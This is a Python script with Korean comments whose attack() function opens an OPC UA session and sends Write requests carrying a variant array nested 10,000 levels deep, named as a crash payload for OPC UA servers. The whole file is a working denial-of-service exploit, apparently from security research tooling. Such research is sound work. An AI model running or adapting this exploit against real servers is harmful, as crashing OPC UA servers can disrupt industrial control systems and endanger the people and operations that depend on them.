import datetime

from protocol import *  # OPC UA 프로토콜 관련된 모듈
from config import *  # 설정값들을 불러오는 모듈

NUM_OF_NESTED_CRASH = 10_000  # 중첩된 배열의 깊이를 정의 (기본값: 10,000)

# attack 함수는 중첩된 배열을 통해 서버에 공격 요청을 보내는 함수
# server_details: 서버 세부 정보 (프로그램 타입, IP 주소, 포트 등)
# num_requests: 보내는 요청 횟수 (기본값: 1)
# num_of_nested: 중첩될 배열의 깊이 (기본값: NUM_OF_NESTED_CRASH)
def attack(server_details, num_requests=1, num_of_nested=NUM_OF_NESTED_CRASH):
    program_type, ip_addr, port, query_string = server_details

    # OPC-UA 세션 생성
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    ### 메시지 생성 ###
    # 01000000 - 배열 크기 1을 나타냄
    # VariantArray 타입 (0x98)
    one_item_variant_array = bytes.fromhex("0100000098")
    # 중첩된 배열 생성: 배열 내 배열을 num_of_nested만큼 중첩
    variants = one_item_variant_array * num_of_nested
    # Write 요청의 헤더 생성
    message_header = opcua.build_opcua_message_header()
    # Write 요청 본문 생성: 노드 아이디와 함께 중첩된 배열을 포함
    message_body = bytes.fromhex("0100a102020000e6446a730d451106c0dbd70171000000ff030000ffffffff00000000000000010000000302001a00000044656d6f2e44796e616d69632e4172726179732e537472696e670d000000ffffffff01")
    message_body += b"\x98"  # Variant 타입: 배열의 배열 (0x98)
    message_body += variants  # 중첩된 배열을 추가

    # 패킷에서 노드 아이디의 길이를 계산
    node_id_len = get_node_id_len_from_packet(message_body)

    # 올바른 세션과 채널 ID를 사용하여 write 요청 생성
    msg_write = bytearray(message_body)
    msg_write[4:4+node_id_len] = OBJECT.build(opcua.auth_id)
    msg_write = bytearray(message_header) + msg_write
    msg_write[8:12] = struct.pack("I", opcua.secure_channel_id)
    msg_write[12:16] = struct.pack("I", opcua.secure_token_id)
    ##################

    # num_requests만큼 메시지 전송
    print(f"[-] Sending MSG Request - Complex nested ({num_of_nested} nested) x {num_requests} times")
    resp = opcua.send_recv(msg_write, num_requests, should_recv=True)
    print(resp[61:])

    # 서버에서 모든 청크가 수신되었는지 확인하기 위해 잠시 대기
    print("[-] Sleeping 0.5 seconds to make sure all chunks are received")
    time.sleep(0.5)

    # 연결 종료
    print("[-] Closing connection")
    opcua.close()
